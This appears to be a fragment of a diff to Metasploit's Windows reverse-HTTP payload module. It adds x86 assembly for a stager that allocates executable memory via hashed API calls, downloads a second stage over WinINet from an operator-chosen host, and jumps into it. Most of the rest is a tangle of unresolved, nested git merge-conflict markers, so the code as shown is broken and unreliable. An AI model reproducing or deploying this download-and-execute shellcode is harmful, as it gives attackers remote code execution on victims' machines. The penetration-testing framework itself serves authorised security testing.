+      push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
+      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+
+    download_prep:
+      xchg eax, ebx          ; place the allocated base address in ebx
+      push ebx               ; store a copy of the stage base address on the stack
+      push ebx               ; temporary storage for bytes read count
+      mov edi, esp           ; &bytesRead
+
+    download_more:
+      push edi               ; &bytesRead
+      push 8192              ; read length
+      push ebx               ; buffer
+      push esi               ; hRequest
+      push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
+      call ebp
+
+      test eax,eax           ; download failed? (optional?)
+      jz failure
+
+      mov eax, [edi]
+      add ebx, eax           ; buffer += bytes_received
+
+      test eax,eax           ; optional?
+      jnz download_more      ; continue until it returns 0
+      pop eax                ; clear the temporary storage
+
+    execute_stage:
+      ret                    ; dive into the stored stage address
+
+    got_server_uri:
+      pop edi
+      call got_server_host
+
+    server_host:
+      db "#{opts[:host]}", 0x00
+    ^
+
+    if opts[:exitfunk]
+      asm << asm_exitfunk(opts)
+    end
+
+>>>>>>> origin/msf-complex-payloads
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -9776,6 +10406,12 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+<<<<<<< HEAD
 >>>>>>> msf-complex-payloads
 >>>>>>> origin/pod/metasploit-api/_index.html
 =======
@@ -9836,6 +10472,10 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
     asm
   end
 
@@ -9868,6 +10508,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 
 >>>>>>> rapid7/feature/complex-payloads
@@ -10053,6 +10694,19 @@ module Payload::Windows::ReverseHttp
 =======
 
 >>>>>>> rapid7/feature/complex-payloads
+=======
+
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
 end
 
 end
